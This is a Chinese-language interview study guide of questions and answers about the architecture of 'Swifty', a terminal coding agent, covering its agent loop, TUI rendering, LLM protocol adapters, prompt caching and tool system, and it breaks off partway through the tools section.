# Swifty CLI — 高级前端工程师面试 Q/A 文档

> 本文档面向高级前端工程师面试场景，围绕 `apps/swifty`（一个运行在终端中的 Coding Agent，类似 Claude Code）的实现细节设计深度问答。
> 所有回答均基于真实源码（`apps/swifty/src/`），回答中标注了关键文件与机制，可作为面试前的系统复习材料。

目录

1. 项目整体架构与设计决策（Q1–Q6）
2. Agent 核心循环与异步迭代（Q7–Q13）
3. LLM 抽象层与流式协议（Q14–Q19）
4. 工具系统与延迟加载（Q20–Q24）
5. 权限系统与 OS 沙箱（Q25–Q29）
6. TUI 渲染层与性能优化（Q30–Q38）
7. 上下文管理与压缩（Q39–Q44）
8. 会话持久化、记忆与钩子（Q45–Q49）
9. 多智能体、技能与 MCP（Q50–Q54）
10. 工程化：构建、测试与配置（Q55–Q58）

---

## 一、项目整体架构与设计决策

### Q1：请用几句话描述 Swifty 的整体架构，并说明它与普通 CLI 工具的本质区别是什么？

答：

Swifty 是一个运行在终端中的 Coding Agent，本质区别不在于"CLI"，而在于它实现了一个 LLM 驱动的自治循环（Agent Loop）：普通 CLI 是"用户输入 → 程序执行 → 输出"的一次性映射，而 Swifty 是"用户目标 → LLM 推理 → 调用工具 → 观察结果 → 再推理"的多轮闭环，直到任务完成。

架构上分为六层：

1. 入口分发层（`src/main.tsx`）：根据 CLI 参数分发到四种模式 —— TUI（默认，Ink/React 交互界面）、print（`-p` 管道模式，支持 `text`/`stream-json` 输出）、remote（Koa + WebSocket 的浏览器 UI）、teammate（子进程后台代理）。
2. Agent 循环层（`src/agent/agent.ts`）：核心是一个 `async *run(): AsyncGenerator<AgentEvent>` 生成器，把"思考-行动"循环抽象为事件流。
3. LLM 抽象层（`src/llm/`）：统一 `LLMClient` 接口（`stream()` + `setSystemPrompt()`），适配 anthropic / openai / openai-compat 三种协议。
4. 工具层（`src/tools/`）：统一 `Tool` 接口（`schema()` + `execute()`），按 `category: read | write | command` 分类，支撑并行调度与权限决策。
5. 表现层（`src/tui/`）：Ink（React for CLI）渲染，`app.tsx`（约 1850 行）作为编排者消费 AgentEvent 流。
6. 横切支撑层：权限（`permissions/`）、上下文压缩（`compact/`）、会话持久化（`session/`）、记忆（`memory/`）、钩子（`hooks/`）、MCP、技能、多智能体（`subagent/`、`teams/`）。

关键设计洞察：四种运行模式消费的是同一个 AgentEvent 流，Agent 核心对 UI 完全无感知 —— 这是"表现层与领域层彻底解耦"的体现。

---

### Q2：为什么 Agent 循环要用 `AsyncGenerator` 而不是 EventEmitter 或回调？这在架构上带来了什么好处？

答：

这是一个关键的技术选型。`agent.run()` 的签名是 `AsyncGenerator<AgentEvent>`，消费侧统一为 `for await (const event of agent.run())`（`tui/app.tsx:1313`）。相比 EventEmitter/回调，AsyncGenerator 带来四个结构性优势：

1. 拉取式背压（pull-based backpressure）：消费方每次 `await` 下一个事件时才驱动 Agent 前进一步。TUI 渲染慢时，Agent 自然减速，不存在 EventEmitter 推送模式下事件积压、需要额外缓冲队列的问题。
2. 控制流即代码：Agent 内部可以用普通的 `while` 循环 + `try/catch` 表达多轮推理、错误恢复、重试（如限流后 `interruptibleSleep` 再 `continue`），逻辑线性可读。用回调则会被迫拆成状态机。
3. 天然的中断语义：调用方 `break` 或对底层 `AbortController` 触发 abort 即可终止生成器，资源（流式连接、睡眠定时器）随生成器帧一并回收，不需要手动 `removeAllListeners`。
4. 统一的消费接口：TUI（Ink React）、print 模式（stdout JSON）、remote 模式（WebSocket 转发）三种宿主用完全相同的 `for await` 循环消费，只是对事件做不同的渲染/序列化。

代价是：生成器只能"推一条主线"，所以并行信息（如子代理进度、团队邮箱消息）通过回调（`onProgress`、`notificationFn`）旁路注入，再被 Agent 循环在每轮开头 drain 成 system-reminder。主线用生成器、旁路用回调，是这个架构的分工。

---

### Q3：项目中 AgentEvent 是如何建模的？为什么用 discriminated union 而不是类继承？

答：

`src/agent/events.ts` 定义了 12 个成员的判别联合（discriminated union）：

| 事件                            | 载荷                                         | 语义                                  |
| ------------------------------- | -------------------------------------------- | ------------------------------------- |
| `stream_text` / `thinking_text` | `text`                                       | 正文/思考增量                         |
| `thinking_complete`             | `thinking, signature`                        | 思考块完成（签名用于 Anthropic 回传） |
| `tool_use`                      | `toolName, toolId, args`                     | 工具调用开始                          |
| `tool_result`                   | `toolName, toolId, output, isError, elapsed` | 工具执行结果                          |
| `turn_complete`                 | —                                            | 一轮（一次 LLM 响应+工具执行）结束    |
| `loop_complete`                 | `stopReason`                                 | 整个 Agent 循环结束                   |
| `usage`                         | `UsageInfo`                                  | token 用量                            |
| `error`                         | `Error`                                      | 错误                                  |
| `compact`                       | `message, boundary?`                         | 发生了上下文压缩                      |
| `retry`                         | `reason, delay`                              | 自我恢复重试                          |
| `permission_request`            | `toolName, args`                             | 权限询问（透传给 UI）                 |

选 discriminated union 而非类继承的原因：

1. 穷尽性检查（exhaustiveness）：消费侧的 `switch (event.type)` 配合 TypeScript 的 `never` 兜底，新增事件类型时所有消费点都会在编译期报错，不会漏处理 —— 这对"TUI、print、remote 三个消费端"的多宿主架构至关重要。
2. 零运行时开销：事件是纯数据（POJO），print 模式的 `stream-json` 输出可直接 `JSON.stringify`，不需要序列化器。
3. 函数式风格契合：整个项目（工具、权限、压缩）都是"接口 + 纯数据"风格，没有深类层次，联合类型比继承更贴合。

---

### Q4：Swifty 的 TUI 选择了 Ink（React for CLI）而不是 Blessed/Ratatui 这类方案，你认为这个决策的权衡是什么？React 模型在终端里带来了什么独特能力？

答：

Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端，而 Swifty 恰恰是一个 UI 复杂度极高的终端程序（流式文本、工具进度、权限对话框、计划审批、团队进度树、斜杠命令自动补全）。权衡如下：

收益：

1. 声明式增量渲染：流式输出本质是"状态随时间变化"，React 的 state→view 映射天然契合。对比 Blessed 的命令式 `box.setContent()`，React 模型下流式文本只是 `setStreamingText(text)`。
2. 组件复用与生态：`ink-spinner`、对话框组件、`<Static>`/`<Box>`/`<Text>` 布局原语可直接组合；团队已有的 React 经验零迁移成本。
3. `<Static>` 组件解决终端特有痛点：终端里已滚出屏幕的内容无法被重绘。Ink 的 `<Static>` 把"已提交消息"写入终端回滚缓冲区（scrollback）且永不重渲染，与动态区（流式内容）分离 —— 这是 Swifty 消除闪烁的核心手段（`app.tsx:1688` 附近）。
4. Hooks 管理复杂状态：`app.tsx` 用约 30 个 `useState`/`useRef` 管理流式文本、权限请求、子代理进度、Ctrl+C 双击退出等状态，逻辑内聚在函数组件中。

代价与应对：

1. 高频 setState 的渲染开销：LLM 每秒吐出数十个 token，逐个触发 React 渲染会导致终端闪烁和 CPU 飙升。Swifty 用 50ms 节流（`streamThrottleRef.current ??= setTimeout(...)`）把 50ms 窗口内的所有 delta 合并为一次渲染。
2. Markdown 重解析的 O(n²) 风险：流式文本每帧全量重解析 markdown 会越来越慢。Swifty 在 `StreamingText` 组件中实现"稳定前缀缓存"——按 `\n\n` 边界拆分，已闭合段落只解析一次并缓存在 ref 中，仅尾部不稳定段逐帧重解析。
3. 终端高度约束：动态区超过终端行数会触发 Ink 清屏，`StreamingText` 做物理行截断（预留 12 行给非聊天组件）。

结论：选 Ink 是用"需要精细的性能工程"换取"声明式 UI 的开发效率"，对于一个交互密集的 Agent 终端是正确的权衡。

---

### Q5：项目的系统提示词（System Prompt）是如何组织的？这种"分段组装"的设计解决了什么问题？

答：

`src/prompt/builder.ts` 实现了 PromptBuilder 模式：系统提示词不是一个巨字符串，而是一组带优先级的"段落（Section）"，按优先级排序后拼接：

| 优先级 | 段落               | 内容                                                              |
| ------ | ------------------ | ----------------------------------------------------------------- |
| 0      | Identity           | "You are Swifty..." 身份定义、安全禁令（防命令注入/XSS/SQL 注入） |
| 10     | System             | 系统级行为准则                                                    |
| 20     | DoingTasks         | 任务执行规范                                                      |
| 30     | ExecutingActions   | 危险操作确认策略                                                  |
| 40     | UsingTools         | 工具使用规范                                                      |
| 50     | ToneStyle          | 语气与风格                                                        |
| 60     | OutputEfficiency   | 输出长度约束                                                      |
| 70     | Environment        | 运行时环境（workDir、OS、shell、git 分支、模型、日期）            |
| 90     | Skills             | 可选：已激活技能                                                  |
| 95     | CustomInstructions | 可选：SWIFTY.md/CLAUDE.md 项目指令                                |
| 100    | Memory             | 可选：长期记忆                                                    |

解决的问题：

1. 可组合性：不同运行模式（TUI / print / subagent）可以裁剪不同段落组合，例如子代理可注入 `systemPromptOverride` 完全替换。
2. 可测试性：每个 section 是独立纯函数，可单测。
3. 缓存友好：Anthropic 客户端在系统提示词上打 `cache_control: { type: "ephemeral" }` 断点（`anthropic.ts:298`），系统提示词整体稳定不变才能命中 prompt cache —— 如果把易变内容（如日期）混在正文里会破坏缓存，所以日期等信息放在靠后的 Environment 段，且会话内不变。
4. 身份保护：Identity 段硬编码了"不得提及 Claude/Anthropic/OpenAI，只能自称 Swifty"的约束，作为品牌与合规防线。

---

### Q6：Swifty 的四种运行模式（TUI / print / remote / teammate）如何复用同一套核心逻辑？这种设计对可测试性有什么意义？

答：

复用的关键是 Agent 核心只依赖注入的接口，不依赖宿主环境：

```
main.tsx ──┬── TUI      → Ink <App>，消费 AgentEvent → React state
           ├── print    → parsePrintFlags → 消费 AgentEvent → stdout（text/stream-json）
           ├── remote   → Koa + WebSocket，消费 AgentEvent → 广播给浏览器 React 前端
           └── teammate → 子进程，消费 AgentEvent → 写文件邮箱/进度文件
```

四个宿主共享：`Agent`（循环）、`ConversationManager`（消息历史）、`ToolRegistry`（工具）、`PermissionChecker`（权限）、`compact`（压缩）、`session`（持久化）。宿主只负责三件事：构造依赖（依赖注入）、消费事件流、处理人机交互（权限确认、提问）。

对可测试性的意义：

1. Agent 核心可无头测试：测试里直接 `for await (const e of agent.run())`，注入 mock `LLMClient`（返回预置 StreamEvent 序列）即可驱动完整循环，不需要终端。`tests/agent.test.ts` 正是这样做的。
2. print 模式即 E2E 测试载体：`tests/run-e2e.mjs` 用 `swifty -p "..."` 非交互模式跑真实端到端场景，因为 print 与 TUI 共享同一核心，print 通过即核心逻辑通过。
3. 权限等交互可注入：`onPermissionRequest` 是一个返回 `Promise<PermissionAction>` 的回调，测试中可以注入"总是允许"，TUI 中注入"弹对话框" —— 同一套代码路径，不同的交互策略。

---

## 二、Agent 核心循环与异步迭代

### Q7：请完整描述 Agent 循环 `run()` 的单轮迭代流程。

答：

`src/agent/agent.ts` 的 `run()` 是一个 `while (looping)` 循环（约 line 137），单轮迭代按严格顺序执行：

1. 最大迭代守卫：`iteration > maxIterations` 时 yield error 并返回，防止失控死循环。
2. 计划模式提醒：若权限模式为 `plan`，注入 system-reminder —— 第 1 轮和每第 5 轮用完整版，其余轮用一行精简版（`plan-mode.ts`，`reminderInterval = 5`），在"持续约束模型行为"与"节省 token"之间折中。
3. 排空旁路通知：把两类异步消息 drain 成 system-reminder 注入对话 —— Hook 引擎排队的通知（`hookEngine.drainNotifications()`）和团队邮箱消息（`notificationFn()`）。
4. 生命周期钩子：依次 fire `turn_start`、`pre_send`。
5. Layer 1 — 工具结果预算：`applyBudget()` 就地修剪超大工具结果（单结果 >50KB 或聚合 >200KB 时落盘为文件，替换为 2KB 预览+路径）。
6. Layer 2 — 自动压缩：`manageContext()` 估算 token，超过自动阈值则执行压缩；压缩后重新 applyBudget 并重新注入长期记忆。
7. 调用 LLM 流式接口：`client.stream()` 返回 AsyncGenerator<StreamEvent>，Agent 把内部事件映射为 AgentEvent 转发给消费方（`text_delta→stream_text`、`thinking_delta→thinking_text`、`tool_call_complete→tool_use` 等），同时累积 `fullText`、`thinkingBlocks`、`toolUses`、`stopReason`。
8. 错误自愈（见 Q9）：`ContextTooLongError` → 强制压缩重试；`RateLimitError` → 按 Retry-After 等待重试。
9. post_receive 钩子。
10. assistant 消息落历史：`addAssistantFull(fullText, thinkingBlocks, toolUses)`。
11. 分支：
    - 有工具调用 → `executeTools()`（分批+权限+钩子），结果落历史，fire `turn_end`，进入下一轮；
    - 无工具调用 → `looping = false`，文件历史快照，yield `loop_complete`，fire `session_end`，循环结束。

值得强调的是顺序设计：预算修剪在压缩之前 —— 先把显式的大结果"溢出"到磁盘（廉价、无损），仍超阈值才做摘要压缩（昂贵、有损）。这是"先低成本手段、后高成本手段"的分层降级思想。

---

### Q8：工具调用的"分批并行"是如何实现的？为什么 read 类工具可以并行而 write/command 不行？

答：

实现分两层：

分批算法（`agent.ts:527` `partitionToolCalls()`）：

```ts
for (const tu of toolUses) {
  const tool = this.registry.get(tu.toolName);
  const safe = (tool?.category ?? "command") === "read";
  if (safe && batches.length > 0 && batches.at(-1)!.concurrent) {
    batches.at(-1)!.blocks.push(tu); // 合并进当前并行批
  } else {
    batches.push({ concurrent: safe, blocks: [tu] }); // 开新批
  }
}
```

规则：连续的 `category === "read"` 工具合并为一个并行批；任何 write/command 工具单独成批（串行）。例如模型一轮输出 `[Read, Read, Grep, Edit, Read, Bash]`，会被分为 `[Read,Read,Grep] | [Edit] | [Read] | [Bash]` 四批。

执行引擎（`streaming-executor.ts`）：`StreamingExecutor` 是 submit/collect 模式 —— 并行批先全部 `submit()` 再一次 `collectResults()`（内部 `Promise.all`）；串行批每 `submit()` 一个立即 `collectResults()`，退化为逐个执行。

为什么 read 可以并行：

1. 无副作用：读文件、glob、grep 不改变系统状态，并发执行结果与顺序无关（可交换性）。
2. 写操作必须保序：Edit/Write/Bash 可能相互依赖（先写文件 A 再 grep A），且模型生成工具调用的顺序本身隐含了因果序，打乱会破坏语义。
3. 未知工具保守降级：`(tool?.category ?? "command")` —— 注册表查不到的工具按 command 处理，串行执行，宁可慢也不冒险。

这个设计的本质：用工具元数据（category）把"模型的扁平输出"还原成"有偏序关系的执行计划"，在不引入复杂 DAG 调度的前提下拿到了读操作的并行收益。

---

### Q9：Agent 循环有哪些"自愈"机制？请分别说明触发条件与恢复策略。

答：

Swifty 有四类自愈机制，都在 `agent.ts` 中：

1. 上下文超长（ContextTooLongError）→ 强制压缩重试

- 触发：LLM API 返回 413 或消息匹配 `/prompts?\s+too\s+long/i`（OpenAI 侧还检查 400 + `context_length_exceeded`）。
- 策略：applyBudget → `forceCompact()` → 清除 usage anchor → 重新注入长期记忆 → yield `compact` 事件 → `continue` 重试本轮。若压缩本身失败才向上抛错。

2. 限流（RateLimitError）→ 退避重试

- 触发：HTTP 429。
- 策略：解析 `Retry-After` 头（默认 5000ms），yield `retry` 事件通知 UI，然后 `interruptibleSleep(waitMs)` —— 睡眠期间若用户按 Ctrl+C 触发 abort，则优雅退出（yield `loop_complete: "interrupted"`）而不是粗暴中断。

3. max_tokens 截断 → 输出上限升级 + 多轮续写

- Phase 1（升级）：首次 `stop_reason === "max_tokens"` 时，把输出上限提升到 `MAX_TOKENS_CEILING = 64000`，把已生成的部分文本作为 assistant 消息落历史，追加用户消息"从断点直接继续"，立即重试。
- Phase 2（多轮恢复）：若升级后仍截断，最多再做 `MAX_OUTPUT_TOKENS_RECOVERIES = 3` 轮续写，提示词改为"把剩余工作拆成更小的块"。任何非 max_tokens 的停止原因都会重置计数器。

4. 未知工具熔断

- 模型幻觉出不存在的工具时，返回 `Error: unknown tool` 结果并让模型自我纠正；但连续 3 次全是未知工具（`consecutiveUnknown >= 3`）则判定模型陷入幻觉循环，直接 yield error 终止循环，避免无意义烧 token。

设计哲学：区分"可恢复故障"与"致命故障" —— 前三类是资源/瞬态问题，用"修正上下文后重试"恢复；第四类是模型行为异常，重试无意义，熔断止损。所有恢复路径都通过 yield 事件让 UI 可见（用户能看到"retrying..."、"compacting..."），不是静默魔法。

---

### Q10：`turn_complete` 与 `loop_complete` 两个事件的边界语义是什么？UI 如何利用这个边界？

答：

- turn（轮）：一次 LLM 响应 + 其引发的全部工具执行。一个用户提问通常包含多个 turn（模型调工具 → 看结果 → 再调工具）。
- loop（循环）：从用户提问到 Agent 彻底完成（模型不再调用工具）的整个过程。

`turn_complete` 在每一轮结束时发出，`loop_complete` 只在循环退出时发出一次。UI 对两者的利用完全不同（`app.tsx` 事件循环）：

`turn_complete` 时（`app.tsx:1401`）：

1. 冲刷（flush）50ms 节流定时器，确保流式文本最终态渲染出来；
2. 清空 `streamingText`，把本轮积累的 thinking + 工具调用折叠为一条 `turn_summary` 消息写入消息列表；
3. 推进 `committedIndexRef`，把新消息"提交"到 `<Static>` 区（进入终端回滚缓冲，永不重绘）。

`loop_complete` 时（`app.tsx:1429`）：

1. 同样冲刷节流、提交消息（这次是 assistant 正文）；
2. 会话持久化（写 JSONL）；
3. 文件历史快照（供 `/rewind` 回滚）；
4. 若处于 plan 模式 → 弹出计划审批对话框。

这个双层边界的价值：turn 是"渲染提交单元"，loop 是"持久化与交互单元"。把 thinking/工具调用折叠成 turn_summary 再进 Static 区，显著减少了 Static 项数量和终端回滚区的渲染压力 —— 用户看到的是简洁的"思考了 3s · 用了 5 个工具"摘要，而不是刷屏的中间过程。

---

### Q11：Agent 循环里为什么要维护 `streamingTextRef` 这样的"可变 ref 镜像"？直接用 state 会有什么问题？

答：

这是 React 异步回调中的经典陈旧闭包（stale closure）问题。Agent 事件循环是一个长生命周期的 `for await` 循环（`app.tsx:1313`），它持有的回调闭包捕获的是循环开始时的 state 快照。以流式文本为例：

```ts
case "stream_text":
  fullText += event.text;                    // 局部变量，可靠
  streamingTextRef.current = fullText;       // ref 镜像，可靠
  streamThrottleRef.current ??= setTimeout(() => {
    setStreamingText(streamingTextRef.current);  // ← 必须读 ref
    streamThrottleRef.current = null;
  }, 50);
```

如果 `setTimeout` 回调里直接读 `fullText` 或 `streamingText`（state）：`fullText` 恰好是事件循环本次迭代的局部变量，但节流回调是在 50ms 后异步执行的，其间可能又到达了多个 `stream_text` 事件 —— 回调读到的是旧值，最后一小段文本会丢帧。用 `streamingTextRef.current`（可变对象的 current 属性）则永远读到最新值。

同理 `permModeRef`：权限检查、plan 模式判断发生在异步回调深处（如 `loop_complete` 处理、ExitPlanMode 工具的 `isPlanMode` 回调），这些回调注册时捕获的 `permMode` state 早已过期，必须用 ref 镜像穿透闭包。

经验法则：事件源（Agent 循环、定时器、工具回调）驱动的异步代码里，"读最新值"用 ref，"驱动渲染"用 state —— Swifty 的模式是写时双写（state + ref），渲染读 state，异步逻辑读 ref。

---

### Q12：权限确认是一个"需要等待用户输入"的交互，而 Agent 循环是一个生成器 —— 二者如何协作？请解释 Promise 悬挂模式。

答：

Swifty 用 Promise-based suspension（Promise 悬挂） 把"同步阻塞等待用户"桥接进异步生成器：

1. Agent 构造时注入回调 `onPermissionRequest: (req) => Promise<PermissionAction>`（`app.tsx:1276`）。
2. 权限检查判定需要询问时，Agent `await onPermissionRequest(...)` —— 生成器在这一帧挂起。
3. TUI 侧的注入实现：把 `resolve` 函数存入 `permissionResolveRef`，同时 `setPermissionRequest({...})` 触发 React 渲染 `PermissionDialog`。
4. 用户在对话框按键选择（Yes / Yes, don't ask again / No），`onComplete` 调用 `permissionResolveRef.current?.(action)`。
5. Promise 兑现 → Agent 的 `await` 恢复，拿到决策继续执行（allow 则执行工具，deny 则返回拒绝结果给模型）。

这个模式的精妙之处：

- Agent 核心完全不知道 UI 的存在：它只知道"await 一个决策"，TUI、测试（直接 resolve "allow"）、remote（通过 WebSocket 等浏览器响应）可以注入完全不同的交互实现。
- 生成器挂起即"免费"的协程暂停：不需要把 Agent 拆成状态机，也不需要轮询。
- 天然的取消语义：用户按 Ctrl+C 时 abort signal 触发，挂起的 Promise 可被 reject，生成器帧清理。

同样的模式复用在 `AskUserQuestionTool`（注入 `Asker` 函数）和计划审批上 —— 所有 HITL 交互统一为"依赖注入的 Promise 工厂"，这是 Swifty 最值得借鉴的交互架构之一。

---

### Q13：Agent 如何防止"工具调用死循环"（模型反复调用工具永不停止）？

答：

多层防线：

1. maxIterations 硬上限：`Agent` 构造参数 `maxIterations`（子代理默认 200），超过即 yield error 终止。这是最基础的保险丝。
2. 未知工具熔断（见 Q9）：连续 3 次调用不存在的工具 → 终止。
3. 压缩熔断器：`MAX_CONSECUTIVE_FAILURES = 3` —— 自动压缩连续失败 3 次后跳过自动压缩（除非达到硬阻塞阈值强制压缩），避免"压缩失败 → 上下文仍超长 → 再压缩"的抖动循环。
4. 工具结果回灌机制：模型调错工具时，错误信息（如 `Error: unknown tool 'xxx'`）作为 tool_result 回喂给模型，模型通常会在下一轮自我纠正 —— 大多数"潜在死循环"在一两轮内就被模型自己化解，硬上限只是兜底。
5. 成本控制视角：每轮都有 `usage` 事件流出，状态栏实时显示 token 消耗，用户可以 Ctrl+C 中断（`interruptibleSleep` 和 abort signal 贯穿全链路）。

工程启示：对自治 Agent，"让模型看到错误自我纠正"是第一道防线（软），迭代计数与熔断是最后防线（硬），软硬结合，且硬防线必须独立于模型行为（不能指望模型自己停下来）。

---

## 三、LLM 抽象层与流式协议

### Q14：`LLMClient` 接口是如何设计的？三套协议（anthropic / openai / openai-compat）的差异被如何收敛？

答：

接口极简化（`llm/client.ts`）：

```ts
interface LLMClient {
  stream(messages, tools, ...): AsyncGenerator<StreamEvent>;
  setSystemPrompt(prompt: string): void;
  // + setMaxOutputTokens 等少量调节方法
}
```

工厂函数 `createClient(config)` 按 `config.protocol` 分发到 `AnthropicClient` / `OpenAIClient` / `OpenAICompatClient`。差异收敛的策略是"统一输出事件流，差异留在消息构造与事件解析两侧"：

| 差异点         | Anthropic                                                                       | OpenAI Responses                                                             | OpenAI Chat Completions                                                             |
| -------------- | ------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| 消息构造       | `buildAnthropicMessages()`：thinking 块、tool_use/tool_result 块、user 交替合并 | `buildOpenAIInput()`：reasoning 项、function_call/function_call_output 项    | `buildChatCompletionMessages()`：assistant 的 `tool_calls` 数组、`role:"tool"` 消息 |
| 思考内容       | `thinking` 块 + `signature` 签名（需原样回传）                                  | reasoning item 的 `summary`                                                  | 非标准 `delta.reasoning_content` 字段                                               |
| 工具增量       | `input_json_delta` 累积 JSON                                                    | function_call arguments 增量                                                 | 按 `tc.index` 的 Map 累积，`finish_reason` 时一次性发出                             |
| 停止原因       | `stop_reason` 字符串                                                            | `status:"incomplete"` + `incomplete_details.reason`                          | `finish_reason`（`length→max_tokens`）                                              |
| 缓存统计       | `cache_read`/`cache_creation`                                                   | `cached_tokens`，且需从 input_tokens 中去重（`Math.max(0, input - cached)`） | 同 Responses                                                                        |
| 上下文超长信号 | 413 或 "prompt too long"                                                        | 400 + `context_length_exceeded`                                              | 同左                                                                                |

收敛点：三家最终都吐出同一个 `StreamEvent` 联合（`text_delta`、`thinking_delta`、`thinking_complete`、`tool_call_start/delta/complete`、`stream_end{stopReason, usage}`）。上层 Agent 对协议零感知 —— 这是典型的防腐层（Anti-Corruption Layer）模式，把第三方 API 的方言翻译为内部统一语言。

一个细节：Chat Completions 的工具调用是"流式碎片"（同一个调用的 id、name、arguments 分多个 chunk 到达，按 `index` 归属），客户端用 `Map<number, {id, name, args}>` 累积，直到 `finish_reason` 才发出 `tool_call_complete` —— 碎片重组逻辑被完全封装在客户端内。

---

### Q15：Prompt Caching 是如何实现的？三个缓存断点分别放在哪里、为什么？

答：

Anthropic 的 prompt caching 按前缀匹配计费优化 —— 从消息开头到 `cache_control` 断点处的内容若与上次请求一致，则命中缓存（cache read 价格约为原价的 1/10）。Swifty 在 `anthropic.ts` 设了三个断点，位置选择体现"稳定性递减"原则：

1. 系统提示词（line 298）：整个 system prompt 打 `cache_control: { type: "ephemeral" }`。系统提示词在一个会话内不变，是最稳定的前缀。
2. 最后一个工具 schema（line 278）：工具列表整体打缓存。工具集只在"发现延迟工具"时变化，相对稳定；且工具 schema 体积大（描述文本长），缓存收益最高。
3. 最后一条 user 消息尾部（`markLastUserTailForCache()`，line 497）：从后往前找到最后一条非空 user 消息，在其最后一个内容块上打断点（通过 `Reflect.set` 动态附加）。这利用了会话的增量特性 —— 每轮请求都是"上一轮全部内容 + 新增尾部"，在最新尾部前打断点，使得整段历史前缀都可命中缓存，只有新增的增量部分按全价计费。

效果：多轮对话中，第 N 轮的输入 token 大部分以 cache read 计价，成本和首 token 延迟（TTFT）都显著下降。`UsageInfo` 里专门有 `cacheReadInputTokens` / `cacheCreationInputTokens` 字段来观测缓存命中率。

注意与压缩的联动：压缩会重写历史（摘要+保留尾部），等于"换前缀"，下一轮必然缓存未命中并重新创建缓存 —— 这是压缩的隐性成本，所以压缩阈值不能设得太激进。

---

### Q16：`buildAnthropicMessages()` 中"user 消息合并"是什么机制？解决什么问题？

答：

Anthropic API 要求消息严格 user/assistant 交替 —— 连续两条同角色消息会被拒绝。但 Swifty 内部有多种场景会产生连续 user 消息：

- 压缩重建后：摘要以 user 消息形式放在开头，若保留尾部的第一条也是 user，则连续；
- `addSystemReminder()`：system-reminder 以 `role: "user"` 落历史（Anthropic 协议无独立 system 角色消息位，system 只能是顶层参数）；
- 团队邮箱通知、Hook 通知注入。

`buildAnthropicMessages()`（`anthropic.ts:105`）的合并规则：若当前 user 文本消息的前一条也是 user 文本消息（且非 tool_result），则把当前内容作为额外 text 块合并进前一条。tool_result 块消息独立处理（它们是协议允许的 user 角色内容块）。

这个"内部模型宽松、出站转换严格"的分层很典型：内部 `ConversationManager` 允许任意追加（简单、不易错），协议合规性在序列化边界一次性保证。对比"每次插入都检查前驱"的方案，序列化时归一化只需处理一次且逻辑集中，不容易在多个注入点漏处理。

---

### Q17：LLM 层的错误分类体系是怎样的？为什么要把错误分类做得这么细？

答：

`llm/errors.ts` 定义了继承体系：

```
LLMError
├── AuthenticationError   (401)
├── RateLimitError        (429, 携带 retryAfter)
├── NetworkError          (非 API 错误：DNS/连接重置等)
└── ContextTooLongError   (413 / prompt too long / context_length_exceeded)
```

分类由协议专属的 `classifyAnthropicError()` / `classifyOpenAIError()` 完成，依据状态码 + 错误消息正则（如 OpenAI 的上下文超长常以 400 返回，需匹配 `context_length_exceeded` / `maximum context length`）。

分类细的原因：Agent 循环的恢复策略是按错误类型分派的 ——

- `ContextTooLongError` → 压缩上下文后重试（可恢复）；
- `RateLimitError` → 按 `retryAfter` 退避后重试（可恢复，且需要解析 Retry-After 头，所以该错误类额外携带数据）；
- `AuthenticationError` → 直接上抛给用户（重试无意义）；
- `NetworkError` → 上抛（当前实现不做自动重试，避免放大故障）。

这是"用类型系统编码恢复语义"的实践：catch 块用 `instanceof` 分派，而不是解析错误消息字符串。新增恢复策略时只需新增错误子类 + 一个分支，符合开闭原则。同时分类发生在防腐层内部，上层面对的永远是统一错误体系，与底层协议无关。

---

### Q18：`UsageAnchor`（用量锚点）机制是如何工作的？它解决了 token 估算的什么痛点？

答：

痛点：上下文压缩需要知道"当前对话占多少 token"，但本地无法精确计算（不同模型的 tokenizer 不同）。纯字符估算（`chars / 3.5`）误差大 —— 中文、代码、base64 的字符/token 比差异悬殊，误差累积会导致"过早压缩（浪费）"或"过晚压缩（爆上下文）"。

UsageAnchor 的解法（`conversation.ts:157`）：用 API 返回的真实用量校准。

```ts
recordUsageAnchor(input, output, cacheRead, cacheCreation) {
  this.baselineTokens = input + cacheRead + cacheCreation + output;
  this._anchorCount = this.history.length;   // 锚点时刻的消息数
}
```

每次 LLM 响应返回真实 `usage` 后记录锚点：`baselineTokens` 是当时全部历史的真实 token 数，`_anchorCount` 是当时的历史长度。之后的估算（`compact.ts:185` `currentContextTokens()`）：

```
currentTokens = baselineTokens + estimateMessages(history.slice(anchorCount))
              = 真实值 + 增量部分的字符估算
```

误差只累积在锚点之后的新增消息上（通常一两轮，误差极小），下一轮 API 响应又会刷新锚点归零误差。这是"测量-估算混合"模式：能用真实数据的绝不用估算，必须估算时把估算窗口压到最短。

锚点失效时机：压缩后（历史被重写，`clearUsageAnchor()`）、ContextTooLongError 恢复后。冷启动（尚无锚点）则全量字符估算兜底。

---

### Q19：工具 schema 在不同协议间如何转换？`ToolSchema` 上有哪些值得注意的扩展字段？

答：

内部统一为 `ToolSchema`（JSON Schema 风格：`{ name, description, input_schema: { type:"object", properties, required } }`），出站时按协议转换：

- Anthropic：直映射为 `Anthropic.Tool`（结构几乎一致），并给最后一个 schema 加 `cache_control` 断点。
- OpenAI Responses：包一层 `{ type: "function", strict: false }`。
- Chat Completions：包两层 `{ type: "function", function: { name, description, arguments: input_schema } }`。

`ToolSchema` 的扩展字段（`tools/types.ts`）体现了前瞻性设计：

- `defer_loading?: boolean` —— 配合延迟加载机制，提示协议层该工具初始不发送；
- `cache_control?: { type: "ephemeral"; ttl?: "5m" | "1h" }` —— Anthropic 缓存提示，支持 1 小时长 TTL；
- `eager_input_streaming?: boolean` —— 标记工具参数可以边生成边流式渲染（TUI 可实时显示"正在写文件 xxx"而不是等参数 JSON 完整）；
- `allowed_callers` —— 限制哪些调用者（如代码执行类工具）可发起调用，用于工具间的调用链权限。

这些字段说明 schema 不只是"给模型看的说明书"，还承载了调度策略（延迟加载）、成本策略（缓存）、UX 策略（流式预览）、安全策略（调用者白名单）四类元信息 —— 是工具系统的"单一事实来源"。

---

## 四、工具系统与延迟加载

### Q20：工具接口是如何设计的？`category` 字段为什么是整个系统的枢纽？

答：

`tools/types.ts` 中的核心接口：

```ts
interface Tool {
  name: string;
  description: string;
  category: "read" | "write" | "command";
  deferred?: boolean; // 初始对模型隐藏，经 ToolSearch 发现
  system?: boolean; // 系统内部工具，绕过子代理工具过滤
  schema(): ToolSchema;
  execute(ctx: ToolContext, args): Promise<ToolResult>;
}
```

`ToolContext` 注入执行环境：`workDir`、`abortSignal`（协作式取消）、`fileHistory`（编辑追踪，供回滚）、`fileStateCache`（先读后写门禁）。

`category` 是枢纽，因为它被三个独立子系统消费：

1. 执行调度：`partitionToolCalls()` 只把 `read` 类并入并行批（见 Q8）；
